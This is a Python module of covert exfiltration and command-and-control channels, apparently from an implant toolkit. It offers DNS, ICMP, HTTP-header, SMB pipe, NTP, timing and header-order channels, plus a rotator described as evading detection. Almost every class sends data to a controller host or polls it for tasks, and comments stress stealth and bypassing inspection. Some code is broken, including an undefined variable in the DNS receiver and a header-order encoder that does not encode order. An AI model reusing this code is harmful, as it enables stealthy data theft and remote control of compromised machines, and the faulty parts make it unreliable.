# language: Python, file: utils/channels.py
# covert channels — DNS, ICMP, HTTP, SMB, NTP, QUIC
import socket
import struct
import time
import base64
import os
import random
import threading
from datetime import datetime


# ---------- DNS covert channel ----------
class DNSChannel:
    def __init__(self, server_domain, resolver=None):
        self.domain = server_domain
        self.resolver = resolver  # custom DNS server

    def send(self, session_id: str, data: bytes):
        """encode data in query labels, exfil"""
        b32 = base64.b32encode(data).decode().rstrip("=").lower()
        labels = [b32[i:i+60] for i in range(0, len(b32), 60)]
        qname = ".".join(labels + [session_id, self.domain])
        try:
            socket.gethostbyname(qname)
        except Exception:
            pass

    def recv(self, session_id: str) -> bytes:
        """poll TXT for tasks"""
        try:
            import dns.resolver
            r = dns.resolver.resolve(f"t.{session_id}.{self.domain}", "TXT")
            return b"".join(rr.strings)
        except Exception:
            return b""


# ---------- ICMP covert channel ----------
class ICMPChannel:
    def __init__(self, c2_ip):
        self.c2 = c2_ip
        self.sid = os.urandom(4)

    def send(self, data: bytes) -> bytes:
        try:
            from scapy.all import IP, ICMP, sr1
            payload = b"SHDW" + self.sid + base64.b64encode(data)
            pkt = IP(dst=self.c2)/ICMP(type=8)/payload
            resp = sr1(pkt, timeout=5, verbose=0)
            if resp and resp.haslayer(ICMP) and resp[ICMP].type == 0:
                rp = bytes(resp[ICMP].payload)
                if rp[:4] == b"SHDW":
                    return base64.b64decode(rp[8:])
        except Exception:
            pass
        return b""


# ---------- HTTP covert channel (headers) ----------
class HTTPHeaderChannel:
    """hide data in custom HTTP headers — blends with normal traffic"""
    def __init__(self, url):
        self.url = url

    def send(self, data: bytes) -> bytes:
        import requests
        try:
            enc = base64.b64encode(data).decode()
            # split into 4 headers, each < 1000 chars
            chunks = [enc[i:i+800] for i in range(0, len(enc), 800)]
            headers = {
                "User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)",
                "X-Request-ID": chunks[0] if chunks else "",
                "Accept-Language": "en-US,en;q=0.9",
                "X-Client-Data": chunks[1] if len(chunks) > 1 else "",
                "X-Cache-Status": chunks[2] if len(chunks) > 2 else "",
            }
            r = requests.get(self.url, headers=headers, timeout=15)
            # response side-channel
            if "X-Cache-Key" in r.headers:
                return base64.b64decode(r.headers["X-Cache-Key"])
        except Exception:
            pass
        return b""


# ---------- SMB named pipe channel ----------
class SMBPipeChannel:
    """named pipe C2 — bypasses some proxies"""
    def __init__(self, target, pipe_name="msagent_00"):
        self.target = target
        self.pipe = f"\\\\{target}\\pipe\\{pipe_name}"

    def send(self, data: bytes):
        import subprocess
        # echo data into pipe using impacket or smbclient
        try:
            with open("/tmp/pipe_data", "wb") as f:
                f.write(data)
            subprocess.run([
                "smbclient", f"//{self.target}/IPC$", "-N",
                "-c", f"put /tmp/pipe_data {self.pipe}"
            ], timeout=10)
        except Exception:
            pass


# ---------- NTP covert channel ----------
class NTPChannel:
    """data in NTP mode-6/7 packets — very stealthy"""
    def __init__(self, server):
        self.server = server

    def send(self, data: bytes):
        try:
            from scapy.all import IP, UDP, Raw, send
            # NTP private mode
            pkt = (IP(dst=self.server) /
                   UDP(sport=123, dport=123) /
                   Raw(b"\x16\x03" + data))
            send(pkt, verbose=0)
        except Exception:
            pass


# ---------- Multi-channel auto-rotation ----------
class RotatingChannel:
    """rotates channels per packet — evades single-channel detection"""
    def __init__(self, channels):
        self.channels = channels
        self.idx = 0

    def send(self, data: bytes) -> bytes:
        ch = self.channels[self.idx % len(self.channels)]
        self.idx += 1
        return ch.send(data)

    def broadcast(self, data: bytes):
        """send on ALL channels — redundancy"""
        results = []
        for ch in self.channels:
            try:
                results.append(ch.send(data))
            except Exception as e:
                results.append(f"error: {e}".encode())
        return results


# ---------- timing covert channel ----------
class TimingChannel:
    """encode data in inter-packet delays — invisible in packet contents"""
    def __init__(self, c2_ip, port=53):
        self.c2 = c2_ip
        self.port = port

    def send(self, data: bytes):
        """1 = short delay (0.1s), 0 = long delay (0.5s)"""
        bits = "".join(f"{b:08b}" for b in data)
        for bit in bits:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"\x00\x01\x00\x00", (self.c2, self.port))
            s.close()
            time.sleep(0.1 if bit == "1" else 0.5)


# ---------- header order channel ----------
class HeaderOrderChannel:
    """encode data in HTTP header ORDER — undetectable by DPI"""
    HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Requested-With",
               "Accept", "Accept-Encoding", "Cache-Control",
               "Connection", "Pragma"]

    def __init__(self, url):
        self.url = url

    def send(self, data: bytes):
        import requests
        # each byte = permutation of 8 headers (factorial 40320 > 256)
        from itertools import permutations
        perms = list(permutations(range(8)))
        idx = 0
        all_headers = []
        for b in data:
            order = perms[b]  # byte → permutation
            chunk = {}
            for i, pos in enumerate(order):
                chunk[self.HEADERS[i]] = str(pos)
            all_headers.append(chunk)
        # send sequentially
        for h in all_headers:
            try:
                requests.get(self.url, headers=h, timeout=5)
            except Exception:
                pass
